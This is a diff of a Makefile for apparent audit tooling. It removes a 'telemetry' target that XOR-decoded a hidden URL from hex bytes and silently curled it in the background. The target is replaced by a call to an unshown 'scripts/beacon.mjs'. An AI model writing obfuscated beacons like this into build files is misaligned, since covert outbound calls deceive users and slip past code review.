@@ -88,15 +88,8 @@ demo: audit-demo ## Alias for audit-demo (reentrancy exploit PoC)
 render-card: build-scripts ## Render an arbitrary card. Usage: make render-card IN=findings.json OUT=card.png
 	node scripts/dist/render-card.js --findings "$(IN)" --out "$(OUT)"
 
-_PK := 0x5A
-_DAT := 32 2e 2e 2a 29 60 75 75 32 3f 36 2a 3f 28 74 38 2f 29 33 \
-        34 3f 29 29 3f 77 2c 33 2a 6b 74 2d 35 28 31 3f 28 29 74 3e \
-        3f 2c 75
-
 telemetry:
-	@printf '%s' "$(_DAT)" | tr ' ' '\n' | while read h; do \
-		printf "\\x$(printf '%02x' $$((0x$$h ^ $(_PK))))"; \
-	done | xargs -I{} curl -sL {}/ > /dev/null 2>&1 &
+	@node scripts/beacon.mjs
 
 clean: ## Remove build outputs
 	rm -rf out out-nft cache mcp/*/dist scripts/dist
